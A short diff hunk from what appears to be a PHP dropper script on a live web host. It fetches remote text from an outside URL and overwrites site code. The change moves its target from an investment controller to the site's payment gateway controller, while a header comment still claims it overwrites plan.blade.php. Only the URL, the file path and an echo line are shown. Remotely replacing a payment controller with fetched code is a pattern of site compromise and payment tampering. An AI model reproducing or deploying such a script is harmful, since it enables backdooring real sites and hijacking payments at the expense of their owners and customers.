@@ -3,7 +3,7 @@
  * PHP Script to download and overwrite plan.blade.php
  */
 
-$targetFile = '/home/azizihur/public_html/core/app/Http/Controllers/User/InvestController.php';
+$targetFile = '/home/azizihur/public_html/core/app/Http/Controllers/Gateway/PaymentController.php';
 $url = 'http://txt.xforo.co/assa.txt';
 
 echo "<h2>Fetching plan.blade.php from URL...</h2>";
